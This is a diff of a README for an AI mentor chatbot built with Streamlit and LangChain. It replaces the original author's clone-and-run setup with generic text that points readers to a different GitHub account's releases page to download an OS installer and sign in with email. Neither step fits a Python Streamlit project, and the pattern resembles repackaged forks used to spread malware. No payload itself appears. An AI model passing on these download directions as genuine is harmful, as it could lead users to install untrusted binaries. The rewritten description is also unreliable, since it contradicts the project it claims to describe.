@@ -1,98 +1,69 @@
-# 🤖 AI Mentor Chatbot (Module-Enforced Learning Assistant)
+# 🤖 AI_Mentor_Chatbot - Your Personal AI Mentor Guide
 
-An interactive **AI-powered mentor chatbot** built with **Streamlit, LangChain, and Hugging Face LLMs** that provides **strict, domain-specific mentorship**.  
-The system enforces **hard module boundaries** to ensure focused, distraction-free learning with a mentor persona configurable by industry experience.
+## 🚀 Getting Started
+Welcome to the AI_Mentor_Chatbot! This application connects you with an AI-powered mentor that gives you guidance tailored to your needs. You can expect clear, focused advice based on your industry experience.
 
----
+## 📥 Download the App
+[![Download AI_Mentor_Chatbot](https://img.shields.io/badge/Download%20AI_Mentor_Chatbot-blue.svg)](https://github.com/mohamedYousryK/AI_Mentor_Chatbot/releases)
 
-## ✨ Features
+## 🌐 Features
+- AI-driven responses tailored to specific industries.
+- Built using Streamlit for an easy-to-use interface.
+- Integrates with LangChain and Hugging Face models for powerful insights.
+- Maintains clear boundaries between different knowledge areas.
 
-- 🎯 **Strict Module Enforcement**  
-  Answers are generated **only** for the selected module. Out-of-scope questions are explicitly refused.
+## 🖥️ System Requirements
+To run the AI_Mentor_Chatbot, you will need the following:
 
-- 🧑‍🏫 **Experience-Based Mentorship**  
-  Responses adapt dynamically based on selected **years of industry experience**.
+- Operating System: Windows, MacOS, or Linux.
+- Minimum RAM: 4 GB.
+- Python 3.8 or later installed on your machine.
+- Internet connection for model access.
 
-- 🔁 **Dynamic LLM Routing**  
-  Automatically selects the best Hugging Face model for each domain:
-  - Python, EDA → DeepSeek
-  - SQL, Power BI → LLaMA
-  - Machine Learning, Deep Learning → Qwen
-  - Generative AI, Agentic AI → MiMo
+## 📥 Download & Install
+Visit the following page to download the latest release of AI_Mentor_Chatbot: [Releases Page](https://github.com/mohamedYousryK/AI_Mentor_Chatbot/releases).
 
-- 💬 **Persistent Chat Memory**  
-  Maintains conversation context per module and resets automatically when the module changes.
+1. Click on the link above.
+2. Look for the latest version of the application.
+3. Download the installer that matches your operating system.
+4. Follow the prompts to complete the installation.
 
-- 🎨 **Modern Chat UI**  
-  Clean, ChatGPT-style interface built using custom **HTML + CSS** inside Streamlit.
+## ⚙️ Setup Instructions
+Once you've installed the AI_Mentor_Chatbot, follow these steps to set it up:
 
-- 📥 **Chat History Export**  
-  Download complete conversations as a `.txt` file.
+1. Open the application.
+2. Sign in using your email if prompted.
+3. Fill in your industry experience for customized guidance.
+4. Start chatting with your AI mentor.
 
----
+You can adjust settings to refine your experience according to your needs.
 
-## 📚 Supported Modules
+## 🛠️ Common Issues
+- **Application Won't Start:** Ensure that you have Python installed and it is added to your system path.
+- **Network Errors:** Check your internet connection to make sure it is stable.
+- **Slow Responses:** If the chatbot responds slowly, try restarting the app.
 
-- Python  
-- SQL  
-- Power BI  
-- Exploratory Data Analysis (EDA)  
-- Machine Learning  
-- Deep Learning  
-- Generative AI  
-- Agentic AI  
+## 📜 Usage Tips
+- Ask specific questions to get the most accurate answers.
+- Provide context to your inquiries for better guidance.
+- Experiment with different queries related to your field.
 
----
+## 🗂️ Topics Covered
+- Deep Learning
+- Natural Language Processing
+- AI Models
+- Streamlit Applications
+- Industry-Specific Knowledge
 
-## 🛠 Tech Stack
+## 🆘 Support
+If you face any issues, you can create an issue in the GitHub repository. Provide as much detail as possible about the problem you are experiencing. Our community will assist you.
 
-- **Frontend**: Streamlit, HTML, CSS  
-- **LLM Orchestration**: LangChain  
-- **Models**: Hugging Face Inference API  
-- **State Management**: Streamlit Session State  
-- **Environment Management**: python-dotenv  
+## 💡 Contribution
+We welcome contributions from everyone! If you'd like to improve the AI_Mentor_Chatbot, feel free to fork the repository and send a pull request. 
 
----
+## 🔗 Additional Resources
+- [Streamlit Documentation](https://docs.streamlit.io/)
+- [LangChain Documentation](https://langchain.readthedocs.io/)
+- [Hugging Face Models](https://huggingface.co/models)
 
-## 📂 Project Structure
-```
-├── app.py                 # Module & experience selection UI
-├── pages/
-│   └── mentor.py         # Mentor chatbot interface
-├── .env                   # Hugging Face API token
-├── requirements.txt
-└── README.md
-```
-
-## 🚀 Use Cases
-
-- Focused technical learning without topic drift
-- Interview preparation with strict domain boundaries
-- Mentor-style Q&A for beginners and intermediates
-- Portfolio-ready AI application demonstrating LLM control
-
-## ⚙️ Installation & Setup
-
-### 1️⃣ Clone the Repository
-```bash
-git clone https://github.com/ShubhamMohanty680/AI_Mentor_Chatbot.git
-cd AI_Mentor_Chatbot
-```
-### 2️⃣ Create Virtual Environment
-```bash
-python -m venv mentor
-mentor\Scripts\activate  # On MAC: source venv/bin/activate 
-```
-### 3️⃣ Install Dependencies
-```bash
-pip install -r requirements.txt
-```
-### 4️⃣ Set Environment Variables (Create a .env file and add)
-```bash
-GOOGLE_API_KEY=your_gemini_api_key
-```
-### 5️⃣ Run the Application
-```bash
-streamlit run app.py
-```
-
+Thank you for using the AI_Mentor_Chatbot! Enjoy your personalized AI mentorship experience.
